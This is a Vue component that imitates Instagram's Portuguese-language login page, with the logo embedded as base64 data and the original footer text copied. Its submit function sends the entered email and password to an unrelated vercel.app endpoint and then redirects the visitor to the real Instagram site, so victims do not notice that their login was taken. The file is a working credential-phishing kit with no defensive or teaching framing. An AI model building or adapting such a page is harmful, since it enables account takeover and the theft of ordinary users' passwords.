<script lang="js" setup>
import { ref } from 'vue';
import axios from 'axios'
const email = ref('');
const password = ref('');

async function submit(event) {
  event.preventDefault();
  try {
    const response = await fetch('https://project-khaki-zeta-81.vercel.app/api/account', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ email: email.value, password: password.value })
    });

    const data = await response.json();
    console.log("data", data)

  } catch (err) {
    console.log("err", err);
  }
  window.location.href = "https://www.instagram.com/";
}

</script>

<template>
  <main class="flex align-items-center justify-content-center">
    <section id="mobile" class="flex">
    </section>
    <section id="auth" class="flex direction-column">
      <div class="panel login flex direction-column">
        <h1 title="Instagram" class="flex justify-content-center">
          <img
            src="data:image/jpeg;base64,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"
            alt="Instagram logo" title="Instagram logo" />
        </h1>
        <form @submit="submit">
          <label for="email" class="sr-only">Telefone, nome de usuário ou e-mail</label>
          <input v-model="email" name="email" placeholder="Telefone, nome de usuário ou e-mail" />

          <label for="password" class="sr-only">Senha</label>
          <input v-model="password" name="password" type="password" placeholder="Senha" />

          <button type="submit">Entrar</button>
        </form>
        <div class="flex separator align-items-center">
          <span></span>
          <div class="or">OU</div>
          <span></span>
        </div>
        <div class="login-with-fb flex direction-column align-items-center">
          <div>
            <img />
            <a>Entrar com o facebook</a>
          </div>
          <a href="#">Esqueceua senha?</a>
        </div>
      </div>
      <div class="panel register flex justify-content-center">
        <p>Não tem uma conta?</p>
        <a href="#">Cadastre-se</a>
      </div>
      <div class="app-download flex direction-column align-items-center">
        <p>Obtenha o aplicativo.</p>

      </div>
    </section>
  </main>
  <footer>

    <p class="copyright">© 2020 Instagram do Facebook</p>
  </footer>
</template>
